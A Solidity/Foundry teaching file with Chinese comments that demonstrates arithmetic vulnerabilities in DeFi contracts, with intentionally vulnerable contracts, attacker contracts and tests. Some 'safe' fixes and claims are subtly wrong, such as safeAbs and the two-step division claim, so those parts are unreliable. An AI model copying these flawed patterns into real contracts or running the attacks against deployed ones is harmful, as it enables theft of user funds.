// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 算术边界漏洞完整PoC集合
 * @notice 覆盖5大类算术安全问题
 * 
 * 1. Overflow/Underflow（溢出/下溢）
 * 2. Signed Integer Misuse（有符号整数误用）
 * 3. Unchecked Blocks（未检查块）
 * 4. Incorrect Multiplication/Division Order（乘除顺序错误）
 * 5. Scaling Factor Mismatch（精度因子不匹配）
 */

// ============ 场景1: Overflow/Underflow (Solidity <0.8) ============

/**
 * @title 经典的溢出漏洞（Solidity 0.7）
 * @notice 使用pragma 0.7展示经典溢出
 */
// 注意：这个合约在0.8中会revert，仅作为教学示例

contract ClassicOverflowExample {
    mapping(address => uint256) public balances;
    
    // Solidity 0.7中的溢出漏洞
    // 在0.8中这会自动revert
    function vulnerableTransfer(address to, uint256 amount) external {
        // 假设attacker余额为100
        // 调用transfer(victim, 200)
        
        // Solidity 0.7: 100 - 200 = underflow = 2^256 - 100
        // Solidity 0.8: 自动revert
        balances[msg.sender] -= amount;  
        balances[to] += amount;
    }
}

/**
 * @title 现代的溢出场景（Solidity 0.8 with unchecked）
 * @notice 即使在0.8，unchecked块仍会溢出
 */
contract ModernOverflowRisk {
    mapping(address => uint256) public balances;
    
    // Unchecked块中的下溢风险
    function riskyBatchTransfer(address[] calldata recipients, uint256[] calldata amounts) external {
        uint256 totalAmount;
        
        // 计算总额
        unchecked {
            for (uint256 i = 0; i < amounts.length; i++) {
                totalAmount += amounts[i];  // ✗ 可能溢出！
            }
        }
        
        require(balances[msg.sender] >= totalAmount, "Insufficient balance");
        
        balances[msg.sender] -= totalAmount;
        
        for (uint256 i = 0; i < recipients.length; i++) {
            balances[recipients[i]] += amounts[i];
        }
    }
}

/**
 * @title Overflow攻击者
 */
contract OverflowAttacker {
    ModernOverflowRisk public target;
    
    constructor(address _target) {
        target = ModernOverflowRisk(_target);
    }
    
    function attack() external {
        console.log("\n=== Unchecked Overflow Attack ===");
        console.log("Attacker balance:", target.balances(address(this)));
        
        // 构造溢出：两个巨大的数相加导致溢出回到小数
        address[] memory recipients = new address[](2);
        recipients[0] = address(this);
        recipients[1] = address(0x1);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = type(uint256).max - 50;  // 2^256 - 51
        amounts[1] = 100;                      // +100
        
        // 在unchecked中：(2^256-51) + 100 = 49 (溢出)
        console.log("Amount 0:", amounts[0]);
        console.log("Amount 1:", amounts[1]);
        console.log("Sum in unchecked:", uint256(49));  // 实际会溢出成49
        
        // 只需要49的余额就能转账巨额
        target.riskyBatchTransfer(recipients, amounts);
        
        console.log("\nAfter attack:");
        console.log("Attacker balance:", target.balances(address(this)));
    }
}

// ============ 场景2: Signed Integer Misuse ============

/**
 * @title 有符号整数转换漏洞
 * @notice int和uint之间的转换可能导致意外行为
 */
contract SignedIntegerVulnerable {
    mapping(address => int256) public signedBalances;
    
    // 有符号整数可以是负数
    function deposit() external payable {
        signedBalances[msg.sender] += int256(msg.value);
    }
    
    // 负数余额可以绕过检查
    function withdraw(uint256 amount) external {
        // 问题：如果signedBalances是负数
        // 转换为uint256会变成巨大的正数！
        require(uint256(signedBalances[msg.sender]) >= amount, "Insufficient balance");
        
        signedBalances[msg.sender] -= int256(amount);
        
        payable(msg.sender).transfer(amount);
    }
    
    // 有符号整数的运算可能意外
    function adjustBalance(int256 adjustment) external {
        signedBalances[msg.sender] += adjustment;  // 可以传负数！
    }
}

/**
 * @title 有符号整数攻击者
 */
contract SignedIntegerAttacker {
    SignedIntegerVulnerable public target;
    
    constructor(address _target) {
        target = SignedIntegerVulnerable(_target);
    }
    
    function attack() external payable {
        console.log("\n=== Signed Integer Attack ===");
        
        // 第1步：存入少量ETH
        console.log("Step 1: Deposit 1 ether");
        target.deposit{value: 1 ether}();
        console.log("Balance (signed):", target.signedBalances(address(this)));
        
        // 第2步：通过adjustBalance设置为负数
        console.log("\nStep 2: Adjust balance to negative");
        target.adjustBalance(-2 ether);  // 1 - 2 = -1 ether
        
        int256 signedBal = target.signedBalances(address(this));
        console.log("Balance (signed):", signedBal);
        
        // 第3步：负数转uint256变成巨大正数
        uint256 unsignedBal = uint256(signedBal);
        console.log("Balance (unsigned):", unsignedBal);
        console.log("This is 2^256 - 1 ether!");
        
        // 现在可以提取远超实际余额的ETH
        // （实际会因为合约余额不足而失败，但这展示了漏洞）
    }
    
    receive() external payable {}
}

/**
 * @title 有符号整数算术漏洞
 * @notice 有符号整数的乘除可能溢出到负数
 */
contract SignedArithmeticVulnerable {
    // 有符号整数可能产生意外的负数
    function calculateReward(int256 baseAmount, int256 multiplier) 
        external 
        pure 
        returns (int256) 
    {
        // 如果baseAmount和multiplier都是负数
        // 结果是正数！
        return baseAmount * multiplier;
    }
    
    // 有符号整数除法可能向零取整
    function divide(int256 a, int256 b) external pure returns (int256) {
        // -5 / 2 = -2 (向零取整，不是向下)
        // 这可能不是期望的行为
        return a / b;
    }
    
    // abs()实现错误
    function vulnerableAbs(int256 x) external pure returns (int256) {
        // ✗ 错误：-2^255无法取反！
        return x < 0 ? -x : x;
        // 如果x = type(int256).min = -2^255
        // -x会溢出！因为正数最大是2^255-1
    }
    
    // 正确的abs实现
    function safeAbs(int256 x) external pure returns (uint256) {
        // 返回uint256，避免溢出
        return x < 0 ? uint256(-x) : uint256(x);
    }
}

// ============ 场景3: Unchecked Blocks ============

/**
 * @title Unchecked块的风险
 * @notice 0.8虽然有检查，但unchecked中仍会溢出
 */
contract UncheckedRisks {
    mapping(address => uint256) public balances;
    
    // 循环计数器用unchecked可能溢出
    function riskyLoop(uint256 iterations) external view returns (uint256) {
        uint256 sum;
        
        unchecked {
            for (uint256 i = 0; i < iterations; i++) {
                sum += i;  // 如果iterations很大，sum会溢出
            }
        }
        
        return sum;
    }
    
    // Unchecked算术用于"优化"可能危险
    function riskyOptimization(uint256 a, uint256 b) external pure returns (uint256) {
        unchecked {
            // 程序员认为a+b不会溢出
            // 但如果输入不受控制，可能溢出
            return a + b;
        }
    }
    
    // 正确使用unchecked：循环计数器
    function safeLoop(uint256 iterations) external pure returns (uint256) {
        uint256 sum;
        
        // 在checked环境计算sum
        for (uint256 i = 0; i < iterations; ) {
            sum += i;
            
            // 只在计数器递增时用unchecked
            unchecked {
                i++;  // i不会溢出到0，因为循环条件限制
            }
        }
        
        return sum;
    }
}

/**
 * @title 真实案例：Uniswap V3的unchecked使用
 * @notice 展示正确和错误的unchecked用法
 */
contract UniswapStyleUnchecked {
    // Uniswap的正确用法
    function computeSwapStep(
        uint160 sqrtRatioCurrentX96,
        uint256 amountRemaining
    ) external pure returns (uint256 amountIn) {
        // 计算保证不会溢出的情况下使用unchecked
        unchecked {
            // 这里的数学保证不溢出
            amountIn = amountRemaining * sqrtRatioCurrentX96 / (1 << 96);
        }
    }
    
    // 错误的unchecked使用
    function riskyComputation(uint256 userInput) external pure returns (uint256) {
        unchecked {
            // 用户输入不受控，可能溢出
            return userInput * 1000000;
        }
    }
}

// ============ 场景4: Multiplication/Division Order ============

/**
 * @title 乘除顺序导致的精度损失
 * @notice 这是DeFi中最常见的漏洞之一！
 */
contract MulDivOrderVulnerable {
    uint256 public constant PRECISION = 1e18;
    
    // 错误顺序：先除后乘
    function badCalculation(uint256 amount, uint256 rate) 
        external 
        pure 
        returns (uint256) 
    {
        // 例如：amount = 1000, rate = 15 (1.5%)
        // 错误：1000 / 100 = 10, 然后 10 * 15 = 150
        // 丢失了小数部分！
        return (amount / 100) * rate;
    }
    
    // 正确顺序：先乘后除
    function goodCalculation(uint256 amount, uint256 rate) 
        external 
        pure 
        returns (uint256) 
    {
        // 正确：1000 * 15 = 15000, 然后 15000 / 100 = 150
        // 保持了精度
        return (amount * rate) / 100;
    }
    
    // 多重除法导致精度损失
    function multipleDivisions(uint256 amount) external pure returns (uint256) {
        // 每次除法都损失精度
        uint256 step1 = amount / 3;      // 损失
        uint256 step2 = step1 / 5;       // 再次损失
        return step2;
    }
    
    // 改进：一次性计算
    function improvedCalculation(uint256 amount) external pure returns (uint256) {
        return amount / (3 * 5);  // 只损失一次
    }
    
    // DeFi常见错误：价格计算精度损失
    function calculatePrice(
        uint256 reserves0,
        uint256 reserves1,
        uint256 amount0
    ) external pure returns (uint256 amount1) {
        // 错误：可能溢出或精度损失
        amount1 = (amount0 * reserves1) / reserves0;
        
        // 问题1：amount0 * reserves1可能溢出
        // 问题2：如果reserves0 > amount0 * reserves1，结果为0
    }
    
    // 正确：使用更高精度
    function safePriceCalculation(
        uint256 reserves0,
        uint256 reserves1,
        uint256 amount0
    ) external pure returns (uint256 amount1) {
        // 方案1：检查溢出
        require(amount0 <= type(uint256).max / reserves1, "Overflow");
        amount1 = (amount0 * reserves1) / reserves0;
        
        // 方案2：使用更高精度的库（如PRBMath）
    }
}

/**
 * @title 精度损失攻击示例
 */
contract PrecisionLossExploit {
    MulDivOrderVulnerable public target;
    
    constructor(address _target) {
        target = MulDivOrderVulnerable(_target);
    }
    
    function demonstrateLoss() external view {
        console.log("\n=== Precision Loss Demonstration ===");
        
        uint256 amount = 999;  // 小于1000的金额
        uint256 rate = 15;     // 1.5%
        
        uint256 badResult = target.badCalculation(amount, rate);
        uint256 goodResult = target.goodCalculation(amount, rate);
        
        console.log("Amount:", amount);
        console.log("Rate:", rate, "(means 1.5%)");
        console.log("\nBad calculation (divide first):", badResult);
        console.log("999/100 = 9, then 9*15 = 135");
        console.log("\nGood calculation (multiply first):", goodResult);
        console.log("999*15 = 14985, then 14985/100 = 149");
        console.log("\nLoss:", goodResult - badResult);
        console.log("That's", ((goodResult - badResult) * 100) / goodResult, "% error!");
    }
}

// ============ 场景5: Scaling Factor Mismatch ============

/**
 * @title 精度因子不匹配
 * @notice DeFi中最难发现的漏洞类型
 */
contract ScalingFactorVulnerable {
    // 不同的代币有不同的小数位数
    uint8 public constant USDC_DECIMALS = 6;   // USDC有6位小数
    uint8 public constant WETH_DECIMALS = 18;  // WETH有18位小数
    uint8 public constant WBTC_DECIMALS = 8;   // WBTC有8位小数
    
    // 没有考虑小数位数差异
    function badSwap(
        uint256 usdcAmount,
        uint256 wethPrice  // 假设价格是1 WETH = 2000 USDC
    ) external pure returns (uint256 wethAmount) {
        // 错误：直接计算，没有调整小数位
        // usdcAmount是6位小数，但wethAmount应该是18位小数
        wethAmount = usdcAmount / wethPrice;
        
        // 例如：2000 USDC (2000 * 10^6) / 2000 = 10^6
        // 但应该是：1 WETH = 10^18
        // 差了10^12倍！
    }
    
    // 正确：调整小数位差异
    function goodSwap(
        uint256 usdcAmount,
        uint256 wethPrice
    ) external pure returns (uint256 wethAmount) {
        // 正确：考虑小数位差异
        // WETH(18) = USDC(6) / price * 10^(18-6)
        wethAmount = (usdcAmount * 1e12) / wethPrice;
    }
    
    // 精度因子混淆
    mapping(address => uint256) public shares;  // 18位精度
    mapping(address => uint256) public deposits; // 代币原生精度
    
    function badDeposit(address token, uint256 amount) external {
        // 假设所有代币都是18位小数
        uint256 shareAmount = amount * 1e18 / getTotalValue();
        shares[msg.sender] += shareAmount;
        deposits[msg.sender] += amount;
    }
    
    function getTotalValue() internal pure returns (uint256) {
        return 1000e18;  // 假设值
    }
    
    // 正确：使用标准化精度
    uint256 public constant NORMALIZED_PRECISION = 1e18;
    
    function goodDeposit(address token, uint256 amount, uint8 tokenDecimals) external {
        // 先标准化到18位精度
        uint256 normalizedAmount = _normalize(amount, tokenDecimals);
        
        uint256 shareAmount = normalizedAmount * NORMALIZED_PRECISION / getTotalValue();
        shares[msg.sender] += shareAmount;
    }
    
    function _normalize(uint256 amount, uint8 decimals) 
        internal 
        pure 
        returns (uint256) 
    {
        if (decimals < 18) {
            return amount * 10**(18 - decimals);
        } else if (decimals > 18) {
            return amount / 10**(decimals - 18);
        }
        return amount;
    }
}

/**
 * @title 真实案例：Yearn的scaling factor bug（简化）
 * @notice 2023年的实际漏洞
 */
contract YearnStyleBug {
    uint256 public totalShares;
    uint256 public totalAssets;  // 混合了不同精度的代币！
    
    mapping(address => uint256) public userShares;
    
    // 没有标准化不同精度的代币
    function deposit(uint256 amount, uint8 tokenDecimals) external {
        uint256 shares;
        
        if (totalShares == 0) {
            shares = amount;  // ✗ 直接使用原始amount
        } else {
            // ✗ totalAssets混合了不同精度
            shares = amount * totalShares / totalAssets;
        }
        
        userShares[msg.sender] += shares;
        totalShares += shares;
        totalAssets += amount;  // ✗ 没有标准化
    }
    
    function withdraw(uint256 shares) external {
        uint256 amount = shares * totalAssets / totalShares;
        
        userShares[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= amount;
    }
}

/**
 * @title Scaling factor攻击
 */
contract ScalingFactorAttacker {
    YearnStyleBug public vault;
    
    constructor(address _vault) {
        vault = YearnStyleBug(_vault);
    }
    
    function attack() external {
        console.log("\n=== Scaling Factor Attack ===");
        
        // 场景：Vault接受USDC(6位)和WETH(18位)
        
        // 第1步：存入1 WETH (18位小数)
        console.log("Step 1: Deposit 1 WETH (1e18)");
        vault.deposit(1e18, 18);
        console.log("Total shares:", vault.totalShares());
        console.log("Total assets:", vault.totalAssets());
        
        // 第2步：另一个用户存入1 USDC (6位小数)
        console.log("\nStep 2: Another user deposits 1 USDC (1e6)");
        // 在实际中这会创建问题
        // shares = 1e6 * 1e18 / 1e18 = 1e6
        // 但USDC的价值远小于WETH
        
        console.log("\nProblem:");
        console.log("1 WETH worth $2000 gets 1e18 shares");
        console.log("1 USDC worth $1 gets 1e6 shares");  
        console.log("The ratio is completely wrong!");
        console.log("USDC depositor got 1e12 times more shares per dollar!");
    }
}

// ============ 综合示例：DeFi协议的多重算术错误 ============

/**
 * @title 综合漏洞的AMM
 * @notice 包含多种算术错误
 */
contract VulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    
    // 错误1：Unchecked可能溢出
    function addLiquidity(uint256 amount0, uint256 amount1) 
        external 
        returns (uint256 shares) 
    {
        if (totalSupply == 0) {
            unchecked {
                // ✗ sqrt可能溢出
                shares = sqrt(amount0 * amount1);
            }
        } else {
            unchecked {
                // ✗ 乘法可能溢出
                shares = min(
                    (amount0 * totalSupply) / reserve0,
                    (amount1 * totalSupply) / reserve1
                );
            }
        }
        
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
        reserve0 += amount0;
        reserve1 += amount1;
    }
    
    // 错误2：乘除顺序导致精度损失
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut)
    {
        // Uniswap公式：amountOut = (amountIn * 997 * reserveOut) / (reserveIn * 1000 + amountIn * 997)
        
        // 错误实现：先除后乘
        uint256 amountInWithFee = (amountIn / 1000) * 997;  // 精度损失！
        amountOut = (amountInWithFee * reserveOut) / (reserveIn + amountInWithFee);
    }
    
    // 错误3：没有考虑代币精度
    function swap(
        uint256 amount0In,
        uint256 amount1In,
        address to,
        uint8 token0Decimals,
        uint8 token1Decimals
    ) external {
        // ✗ 直接使用原始金额，没有标准化
        // 如果token0是USDC(6位)，token1是WETH(18位)
        // 计算会完全错误
        
        if (amount0In > 0) {
            reserve0 += amount0In;
        }
        if (amount1In > 0) {
            reserve1 += amount1In;
        }
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

// ============ 防御示例 ============

/**
 * @title 安全的数学库使用
 */
contract SafeMathExample {
    // 使用OpenZeppelin的SafeCast
    function safeCastExample(uint256 value) external pure returns (uint128) {
        require(value <= type(uint128).max, "Value too large");
        return uint128(value);
    }
    
    // 使用PRBMath进行高精度计算
    function highPrecisionMul(uint256 a, uint256 b) external pure returns (uint256) {
        // PRBMath提供高精度的乘除
        // return PRBMath.mulDiv(a, b, 1e18);
        
        // 手动实现安全的mulDiv
        return mulDiv(a, b, 1e18);
    }
    
    function mulDiv(uint256 a, uint256 b, uint256 denominator) 
        internal 
        pure 
        returns (uint256 result) 
    {
        // 使用512位精度避免溢出
        uint256 prod0;
        uint256 prod1;
        
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }
        
        if (prod1 == 0) {
            return prod0 / denominator;
        }
        
        require(denominator > prod1, "Overflow");
        
        // ... 完整实现见PRBMath
        result = prod0 / denominator;  // 简化
    }
}

// ============ Foundry 测试 ============

contract ArithmeticBoundariesTest is Test {
    ModernOverflowRisk public overflowContract;
    SignedIntegerVulnerable public signedContract;
    MulDivOrderVulnerable public precisionContract;
    ScalingFactorVulnerable public scalingContract;
    
    function setUp() public {
        overflowContract = new ModernOverflowRisk();
        signedContract = new SignedIntegerVulnerable();
        precisionContract = new MulDivOrderVulnerable();
        scalingContract = new ScalingFactorVulnerable();
    }
    
    function testOverflowInUnchecked() public {
        console.log("=== Testing Unchecked Overflow ===");
        
        // 给攻击者一些余额
        overflowContract.balances(address(this));
        
        address[] memory recipients = new address[](2);
        recipients[0] = address(this);
        recipients[1] = address(0x1);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = type(uint256).max - 50;
        amounts[1] = 100;
        
        console.log("Amount 0:", amounts[0]);
        console.log("Amount 1:", amounts[1]);
        
        // 在unchecked中，这会溢出成49
        uint256 sum;
        unchecked {
            sum = amounts[0] + amounts[1];
        }
        console.log("Sum (overflow):", sum);
        
        assertTrue(sum == 49, "Should overflow to 49");
    }
    
    function testSignedIntegerConversion() public {
        console.log("=== Testing Signed Integer Misuse ===");
        
        int256 negative = -1 ether;
        uint256 asUnsigned = uint256(negative);
        
        console.log("Signed value:", uint256(-negative), "(displayed as positive)");
        console.log("Unsigned value:", asUnsigned);
        console.log("Equals max uint256:", asUnsigned == type(uint256).max);
        
        assertTrue(asUnsigned > 1000 ether, "Negative becomes huge positive");
    }
    
    function testPrecisionLoss() public {
        PrecisionLossExploit demonstrator = new PrecisionLossExploit(address(precisionContract));
        demonstrator.demonstrateLoss();
    }
    
    function testScalingFactorMismatch() public {
        console.log("=== Testing Scaling Factor Mismatch ===");
        
        uint256 usdcAmount = 2000 * 1e6;  // 2000 USDC
        uint256 wethPrice = 2000;         // 1 WETH = 2000 USDC
        
        uint256 badResult = scalingContract.badSwap(usdcAmount, wethPrice);
        uint256 goodResult = scalingContract.goodSwap(usdcAmount, wethPrice);
        
        console.log("USDC amount:", usdcAmount, "(6 decimals)");
        console.log("WETH price:", wethPrice);
        console.log("\nBad result:", badResult);
        console.log("Good result:", goodResult);
        console.log("Difference factor:", goodResult / badResult);
        
        assertTrue(goodResult == badResult * 1e12, "Should differ by 10^12");
    }
}

/**
 * ============ 知识点总结 ============
 * 
 * 1. Overflow/Underflow:
 *    - Solidity 0.8+自动检查
 *    - 但unchecked块仍会溢出
 *    - 循环计数器可以安全使用unchecked
 *    - 用户输入的计算不能用unchecked
 * 
 * 2. Signed Integer Misuse:
 *    - int转uint会产生意外的大数
 *    - 负数在某些上下文可能绕过检查
 *    - abs()实现要小心type(int256).min
 *    - 有符号除法向零取整
 * 
 * 3. Unchecked Blocks:
 *    - 用于gas优化，但要确保安全
 *    - 只在数学保证不溢出时使用
 *    - 循环i++可以用unchecked
 *    - 用户输入的算术不能用unchecked
 * 
 * 4. Multiplication/Division Order:
 *    - 先乘后除保持精度
 *    - 先除后乘会损失小数部分
 *    - DeFi中最常见的精度问题
 *    - 每次除法都损失精度
 * 
 * 5. Scaling Factor Mismatch:
 *    - 不同代币有不同小数位
 *    - 必须标准化到统一精度
 *    - DeFi协议最难发现的bug
 *    - 可能导致巨大的价值错误
 */
